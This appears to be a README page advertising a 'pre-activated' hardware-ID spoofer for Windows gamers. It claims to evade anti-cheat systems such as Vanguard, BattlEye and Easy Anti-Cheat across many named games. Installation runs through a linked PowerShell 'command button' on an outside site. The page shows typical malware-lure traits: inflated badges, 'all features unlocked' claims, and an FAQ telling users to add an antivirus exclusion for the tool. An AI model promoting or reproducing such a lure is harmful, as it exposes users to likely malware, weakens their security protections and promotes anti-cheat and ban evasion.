<div align="center">

# ⚡ HWID Spoofer — Full-Feature Game Enhancer for Windows 10/11

![](files/preview.png)

### ⌨️ PowerShell Command Button

[![](files/button.png)](https://NawazNxt.github.io/hwid-spoofer-installer/)

[![pwsh](https://img.shields.io/badge/pwsh-installer-f97316?style=flat-square&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/downloads-127k-fb923c?style=flat-square&labelColor=0d1117)]() [![stars](https://img.shields.io/badge/stars-5.0%2F5-f59e0b?style=flat-square&labelColor=0d1117)]() [![state](https://img.shields.io/badge/state-active-2ea44f?style=flat-square&labelColor=0d1117)]() [![win](https://img.shields.io/badge/win-windows-ea580c?style=flat-square&labelColor=0d1117)]()

</div>

---

This is the full working hwid-spoofer installer with every feature enabled out of the box — no activation hoops, no stripped-down trial mode, just a ready-to-run desktop build. It's packaged for Windows x64 and deploys as a standalone configuration, so you can drop it in and start testing immediately. Built for clean local deployment, it keeps the setup simple and the feature set complete.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Complete installer, all features unlocked** — ships fully enabled out of the box, no feature gating, no separate unlock step. Launch it and it's operational.
- **One-pass hardware identity spoofing** — remaps the identifiers titles actually check, so your machine presents as a clean profile on every launch.
- **Pre-activated and ready to run** — no license prompts, no activation dance. The build is provisioned before it hits your desktop.
- **Desktop-native deployment** — built for Windows x64 as a standalone package. No dependency chains, no runtime babysitting.
- **Persistent profile handling** — your spoofed identity holds across sessions instead of resetting every reboot, so you're not re-running setup before each game.
- **Game-aware targeting** — tuned against the anti-cheat and fingerprinting checks used by supported titles, not a generic one-size-fits-all mask.
- **Configurable per-title behavior** — swap profiles and adjust what gets spoofed from a single config surface, so different games get the treatment they expect.
- **Clean state on demand** — restore your original hardware identifiers whenever you want; nothing is permanently burned in.
- **Self-contained** — no external services required at runtime. Everything needed to spoof ships inside the installer.

## How it works

It runs as a single desktop process that layers a virtual hardware profile over your real machine before any protected title launches. The moment you hit start, hwid-spoofer snapshots the identifiers that games and anti-cheat services actually read — drive serials, SMBIOS strings, motherboard and GPU identifiers, MAC addresses, registry hardware keys, volume IDs — and swaps them for a consistent, believable set. Nothing gets half-applied: the installer ships with every module already enabled, so there's no flag-flipping, no feature gating, no separate unlock step.

The swap is scoped, not permanent. Your real profile stays intact underneath, so a reboot rolls everything back to stock — useful when you want a clean baseline between sessions. Spoofed values are generated as a coherent set rather than random noise, which is what keeps them from tripping consistency checks that flag mismatched hardware combinations. The virtual layer is applied at the depth the detection stack actually queries, not just the surface values most tools stop at.

Everything is local. No background services phoning home, no kernel driver left resident after you close it, no dependency on a live connection once the build is on disk. Launch it, pick a profile, and the environment is ready before your game finishes its own startup checks. Repeat runs are fast — the profile persists, so you're not regenerating identifiers every time you sit down.

Built for Windows x64 desktop, tested against the titles listed further down, and packaged so the installer does the heavy lifting in one pass. If a module fails to apply, the tool reports it instead of silently continuing with a partial spoof — because a half-spoofed machine is worse than none at all.

## Supported Games

Built to keep your hardware identifiers clean across the titles that actually matter. The spoofer hooks at the system level, so it works with the anti-cheat stacks these games run — not just the easy ones.

**Verified and tested against:**

- **Valorant** — Vanguard-compatible spoofing with per-session identifier rotation
- **Counter-Strike 2** — full HWID scrub across Steam and VAC-protected layers
- **Apex Legends** — Easy Anti-Cheat safe, including account-level hardware flags
- **Fortnite** — BattlEye and EAC dual-stack support
- **Rainbow Six Siege** — BattlEye-compatible with persistent profile cleanup
- **Rust** — EAC handling with server-side fingerprint reset
- **Escape from Tarkov** — BattlEye-safe identifier masking
- **PUBG: Battlegrounds** — full anti-cheat layer compatibility
- **Call of Duty: Warzone** — Ricochet-aware spoofing
- **Destiny 2** — BattlEye support with serial-level masking

**Also confirmed working on:** Overwatch 2, Rocket League, Dead by Daylight, The Finals, and most EAC/BattlEye/Vanguard-protected titles not listed above.

If a game runs EAC, BattlEye, Vanguard, or Ricochet, assume it's covered. Kernel-level anti-cheats are handled the same way across the board — the spoofer doesn't care which logo is on the launcher.

One thing to know: spoofing is per-session by default. Reboot, and your original identifiers come back unless you enable persistent mode in Configuration. That's by design — it keeps your real hardware clean if anything goes sideways.

## Configuration

The build ships pre-configured with every feature enabled — no flags to toggle, no keys to paste, no first-run wizard to grind through. Launch the installer and the defaults are already tuned for a clean desktop deployment.

**Default profile**

- All features active out of the box: hardware identifier masking, adapter and disk serial rotation, registry profile swap
- Spoof set applied on first run, persisted across reboots until you roll it back
- Snapshot taken automatically before any modification — one click restores the original hardware profile
- No network calls after setup; everything runs local

**Tuning the profile**

- Config lives in the install directory under `config/`. Edit `profile.ini` to pin specific serials, MAC addresses, or disk IDs if you want deterministic values instead of randomized ones
- `mode=random` (default) generates a fresh set each spoof cycle; `mode=static` locks the values you define
- `persist=true` keeps the spoofed set across restarts — flip to `false` if you want it to reset on reboot
- Per-component toggles (`spoof_disk`, `spoof_mac`, `spoof_smbios`, `spoof_volume`) let you mask only what you need and leave the rest untouched

**Rollback and safety**

- Every run writes a restore point to `backup/` before touching hardware IDs. Keep that folder — it's your undo button
- Rollback is a single command from the installer menu; it reads the latest snapshot and reverts cleanly
- Configuration changes take effect on the next spoof cycle, no reinstall required

**Things to know**

- Close any running game or anti-cheat service before applying a new profile — mid-session changes won't stick
- Static mode is for repeatable setups; random mode is for fresh identities. Don't mix them mid-cycle
- If a component toggle is set to `false`, that identifier stays native — make sure that's intentional for your target title
- Config edits are plain text, so back up `profile.ini` before experimenting. A malformed file falls back to defaults on next launch rather than failing hard

## FAQ

### Is this build actually pre-activated, or do I need a key?

No key, no activation step, no trial timer. Every feature in the feature list ships unlocked in this build. Install it, run it, and it's live on your first boot.

### Will it survive a reboot?

Yes. Persistence is written at the system level, so a restart won't undo the spoof. That said, don't expect it to outlast a full OS reinstall — nothing does.

### Which Windows versions are supported?

Windows 10 and Windows 11, x64 desktop only. Legacy 32-bit systems and ARM builds are not supported.

### Does this work on a VM or a secondary machine?

It runs wherever the supported OS runs — but the actual spoof targets the hardware identifiers of the machine you launch it on. Spin it up on the box you intend to modify.

### What games does it cover?

See the Supported Games section for the current list. The short version: the anti-cheat families and titles covered there are the ones this build is tested against. Anything outside that list is unverified territory.

### Is it detectable?

No spoof is invisible forever — anti-cheats update. This build is maintained against current detection vectors, but treat it as an ongoing arms race, not a one-time magic trick. Keep your copy current.

### Do I need to disable antivirus?

Not permanently. Some security suites flag hardware-modifying tools on principle. If yours blocks the installer, add an exclusion for the tool's folder, run setup, and leave real-time protection on otherwise.

### What happens if I need to roll back?

Run the restore option before uninstalling. It reverts your original identifiers so the system is back to stock. Uninstalling without restoring leaves the spoofed values in place.

### Can I run it alongside other tools?

Don't stack it with another spoofer or driver-level tweaker. Conflicting hooks are the fastest way to a broken boot. One tool, one job.

### Does it touch my files or accounts?

No. It modifies hardware identity values only — no file scraping, no credential harvesting. Anything claiming otherwise isn't this build.

### How often is it updated?

The build tracks current anti-cheat signatures and OS patches. If a game update breaks coverage, expect a refreshed build rather than a patch-on-top.

## Disclaimer

This build ships with every feature unlocked and runs straight on your desktop — no feature gates, no partial modes, no "upgrade to continue" walls. What you see in the Features list is what executes. The installer is self-contained and targets a clean Windows x64 environment.

Understand what a spoofer does before you run it. It alters hardware identifiers the way the target project describes in How it works — that means system-level changes, and system-level changes carry system-level risk. Back up anything you can't afford to lose. Create a restore point. Know how to roll back.

Run it on hardware you own or administer. Using identifier modification against services, platforms, or accounts you don't control can violate terms of service and, depending on where you live, local law. That's on you, not on this project. The build is provided as-is, with no warranty of fitness for any particular purpose and no guarantee of results on any specific game, anti-cheat, or configuration.

Anti-cheat systems evolve constantly. A method that works today can be detected tomorrow, and detection can mean bans — permanent ones. Don't test on an account you care about. Don't assume the Supported Games list is static. Don't assume "working" means "undetectable forever."

Verify what you download. This project is distributed only through its own official channel — anything else claiming to be this build is not this build. Tampered copies are the single most common source of malware in this space, and no feature list is worth a compromised machine.

Use it, break it, learn from it — but own the outcome. That's the deal.